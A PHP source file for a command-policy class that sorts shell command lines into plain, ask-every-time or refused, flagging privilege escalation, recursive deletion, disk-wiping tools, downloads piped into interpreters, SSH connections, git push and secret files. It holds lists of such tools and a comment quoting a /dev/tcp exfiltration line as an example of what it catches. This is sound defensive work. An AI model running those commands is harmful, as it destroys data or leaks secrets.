<?php

declare(strict_types=1);

namespace App\Policy;

use App\Shell\CommandLine;
use App\Shell\Opacity;
use App\Shell\SimpleCommand;

/**
 * Weighs each part of a command line: plain, asked about every time, or refused by the policy.
 */
final readonly class CommandPolicy
{
    /** Programs that run another program given among their arguments. */
    public const array WRAPPERS = [
        'command', 'builtin', 'exec', 'env', 'nice', 'nohup', 'time', 'timeout', 'stdbuf', 'ionice', 'xargs', 'watch',
        'unbuffer', 'setsid', 'chronic', 'flock',
    ];

    private const array OTHER_USER_RUNNERS = ['sudo', 'su', 'doas', 'pkexec', 'runuser'];

    private const array DATA_DESTROYERS = ['dd', 'shred', 'wipefs', 'fdisk', 'sfdisk', 'parted'];

    public const array SHELLS = ['sh', 'bash', 'zsh', 'dash', 'ksh', 'fish'];

    public const array INTERPRETERS = [...self::SHELLS, 'python', 'python3', 'perl', 'ruby', 'php', 'node'];

    private const array DOWNLOADERS = ['curl', 'wget', 'fetch'];

    private const array SSH_CLIENTS = ['ssh', 'scp', 'sftp'];

    /** Options with which an interpreter runs code given on its command line rather than what it reads. */
    public const array INLINE_CODE_OPTIONS = ['-c', '-e', '-r', '-m'];

    /** Find actions that change files or run a command on each file found. */
    private const array FIND_ACTIONS = ['-delete', '-exec', '-execdir', '-ok', '-okdir'];

    public function __construct(
        private SecretFiles $secretFiles,
        private GitCommands $gitCommands,
    ) {
    }

    /**
     * @param list<RefusedCommand> $refusals
     */
    #[\NoDiscard('a line is run or asked about by its assessment')]
    public function assess(CommandLine $line, array $refusals = []): Assessment
    {
        $verdict = Verdict::Plain;
        $reasons = [];
        $needsSshAgent = false;
        $hasOtherParts = false;
        $isDownloadPiped = false;

        foreach ($line->commands as $command) {
            $isDownloadPiped = $command->readsPipe && $isDownloadPiped;
            foreach ($this->concerns($command, $refusals, $isDownloadPiped) as [$concernVerdict, $reason]) {
                $reasons[] = \sprintf('`%s`: %s', implode(' ', $command->words), $reason);
                $verdict = $concernVerdict->isWorseThan($verdict) ? $concernVerdict : $verdict;
            }
            $reachesARemote = $this->reachesARemote($command->programWords());
            $needsSshAgent = $needsSshAgent || $reachesARemote;
            $hasOtherParts = $hasOtherParts || !$this->isRemoteOrCd($command, $reachesARemote);
            $isDownloadPiped = $isDownloadPiped || \in_array(basename($command->programWords()[0] ?? ''), self::DOWNLOADERS, true);
        }

        if ($line->opacity instanceof Opacity) {
            $reasons[] = $line->opacity->reason();
            $verdict = Verdict::AskEveryTime->isWorseThan($verdict) ? Verdict::AskEveryTime : $verdict;
        }

        return new Assessment($verdict, $reasons, $needsSshAgent, $needsSshAgent && $hasOtherParts);
    }

    /**
     * A remote or a `cd`, with no redirection: grants read words only, and `git remote -v > /dev/tcp/host/port` would
     * send the remotes, on the open network, where no grant vouched for.
     */
    private function isRemoteOrCd(SimpleCommand $command, bool $reachesARemote): bool
    {
        $isCd = 'cd' === ($command->programWords()[0] ?? null);

        return ($reachesARemote || $isCd) && [] === $command->redirections;
    }

    /**
     * @param list<RefusedCommand> $refusals
     *
     * @return list<array{Verdict, string}>
     */
    private function concerns(SimpleCommand $command, array $refusals, bool $isDownloadPiped): array
    {
        $concerns = [];
        $words = $command->programWords();

        $refused = $this->refusalMatching($words, $refusals);
        if ($refused instanceof RefusedCommand) {
            $concerns[] = [Verdict::Refused, \sprintf('the policy in %s refuses `%s`', $refused->source, implode(' ', $refused->words))];
        }

        $danger = $this->danger($words, $command->readsPipe, $isDownloadPiped);
        if ($danger instanceof Danger) {
            $concerns[] = [Verdict::AskEveryTime, $danger->reason()];
        }

        foreach ($this->secretFilesNamed($command) as $secret) {
            $concerns[] = [Verdict::AskEveryTime, \sprintf('it names %s, which usually holds secrets', $secret)];
        }
        if ($this->uploadsUnknownFiles($command)) {
            $concerns[] = [Verdict::AskEveryTime, 'it uploads the files a pattern names, too many to check'];
        }

        return $concerns;
    }

    /**
     * @param list<string>         $words
     * @param list<RefusedCommand> $refusals
     */
    private function refusalMatching(array $words, array $refusals): ?RefusedCommand
    {
        foreach (Invocations::of($words) as $invocation) {
            foreach ($refusals as $refusal) {
                if ($this->startsWith($invocation, $refusal->words)) {
                    return $refusal;
                }
            }
        }

        return null;
    }

    /**
     * @param list<string> $words
     * @param list<string> $prefix
     */
    private function startsWith(array $words, array $prefix): bool
    {
        if (\count($words) < \count($prefix) || [] === $prefix) {
            return false;
        }
        $words[0] = basename($words[0]);
        $prefix[0] = basename($prefix[0]);

        return \array_slice($words, 0, \count($prefix)) === $prefix;
    }

    /**
     * @param list<string> $words
     */
    private function danger(array $words, bool $readsPipe, bool $isDownloadPiped): ?Danger
    {
        foreach (Invocations::of($words) as $invocation) {
            $danger = $this->dangerOfProgram($invocation, $readsPipe, $isDownloadPiped);
            if ($danger instanceof Danger) {
                return $danger;
            }
        }

        return null;
    }

    /**
     * @param list<string> $words
     */
    private function reachesARemote(array $words): bool
    {
        foreach (Invocations::of($words) as $invocation) {
            $program = basename($invocation[0] ?? '');
            $arguments = \array_slice($invocation, 1);
            $isRemoteGit = 'git' === $program
                && \in_array($this->gitCommands->subcommand($arguments)?->name, GitCommands::REMOTE_SUBCOMMANDS, true);
            if ($isRemoteGit || $this->connectsOverSsh($program, $arguments)) {
                return true;
            }
        }

        return false;
    }

    /**
     * @param list<string> $words
     */
    private function dangerOfProgram(array $words, bool $readsPipe, bool $isDownloadPiped): ?Danger
    {
        $program = basename($words[0] ?? '');
        $arguments = \array_slice($words, 1);

        return match (true) {
            \in_array($program, self::OTHER_USER_RUNNERS, true) => Danger::RunsAsAnotherUser,
            'rm' === $program && $this->hasFlag($arguments, 'rR', '--recursive') => Danger::DeletesRecursively,
            \in_array($program, self::DATA_DESTROYERS, true), str_starts_with($program, 'mkfs') => Danger::DestroysData,
            'find' === $program && [] !== array_intersect($arguments, self::FIND_ACTIONS) => Danger::ActsOnWhatItFinds,
            'git' === $program => $this->gitDanger($arguments),
            $this->connectsOverSsh($program, $arguments) => Danger::ConnectsToAnotherMachine,
            'eval' === $program, \in_array($program, self::SHELLS, true) && $this->hasFlag($arguments, 'c') => Danger::RunsAString,
            $readsPipe && \in_array($program, self::INTERPRETERS, true) && $this->readsItsInput($arguments) => $isDownloadPiped ? Danger::RunsADownload : Danger::RunsWhatIsPiped,
            default => null,
        };
    }

    /**
     * @param list<string> $arguments
     */
    private function gitDanger(array $arguments): ?Danger
    {
        $subcommand = $this->gitCommands->subcommand($arguments);

        return match (true) {
            !$subcommand instanceof GitSubcommand => null,
            $subcommand->isShellAlias => Danger::RunsAGitShellAlias,
            'push' === $subcommand->name => Danger::PushesToRemote,
            default => null,
        };
    }

    /**
     * @param list<string> $arguments
     */
    private function connectsOverSsh(string $program, array $arguments): bool
    {
        if (\in_array($program, self::SSH_CLIENTS, true)) {
            return true;
        }

        // rsync reaches another machine when a path names a host: host:path, user@host:path or rsync://host/path.
        return 'rsync' === $program
            && array_any($arguments, static fn (string $argument): bool => 1 === preg_match('#^(rsync://|[^/-][^/]*:)#', $argument));
    }

    /**
     * Whether a short flag among $letters is set, alone or bundled (-rf), or a long option among $longOptions.
     *
     * @param list<string> $arguments
     */
    private function hasFlag(array $arguments, string $letters, string ...$longOptions): bool
    {
        return array_any($arguments, static fn (string $argument): bool => \in_array($argument, $longOptions, true) || 1 === preg_match('/^-[A-Za-z]*['.$letters.'][A-Za-z]*$/', $argument));
    }

    /**
     * Whether an interpreter is given no script nor inline code, and so runs what it reads.
     *
     * @param list<string> $arguments
     */
    private function readsItsInput(array $arguments): bool
    {
        foreach ($arguments as $argument) {
            if (\in_array($argument, self::INLINE_CODE_OPTIONS, true)) {
                return false;
            }
            if ('-' !== $argument && !str_starts_with($argument, '-')) {
                return false;
            }
        }

        return true;
    }

    private function uploadsUnknownFiles(SimpleCommand $command): bool
    {
        return array_any(
            Invocations::of($command->programWords()),
            static fn (array $invocation): bool => 'curl' === basename($invocation[0] ?? '') && CurlFiles::uploadsUnknownFiles($invocation),
        );
    }

    /**
     * @return list<string>
     */
    private function secretFilesNamed(SimpleCommand $command): array
    {
        $candidates = \array_slice($command->words, 1);
        foreach ($command->redirections as $redirection) {
            $candidates[] = $redirection->target;
        }
        foreach (Invocations::of($command->programWords()) as $invocation) {
            if ('curl' === basename($invocation[0] ?? '')) {
                array_push($candidates, ...CurlFiles::sentBy($invocation));
            }
        }

        $secrets = [];
        foreach ($candidates as $candidate) {
            // Each part of an option's or an assignment's value may name a file: --env-file=.env, FILE=id_rsa,
            // key=@id_rsa;filename=public.txt. curl's own files come from CurlFiles above; this word check stays for
            // every program, curl included, so that it only adds to what is found. The whole word and its value count
            // as well as each part, as written too: a quote or a comma can be part of a file's name.
            $equals = strrpos($candidate, '=');
            $value = false === $equals ? $candidate : substr($candidate, $equals + 1);
            $parts = [$candidate, $value, ...explode('=', str_replace([';', ',', '@'], '=', $candidate))];
            foreach (array_unique($parts) as $part) {
                $sent = ltrim($part, '@<');
                foreach (array_unique([$part, $sent, trim($sent, '"\'')]) as $path) {
                    if ($this->secretFiles->isSecret($path)) {
                        $secrets[] = $path;
                    }
                }
            }
        }

        return array_values(array_unique($secrets));
    }
}
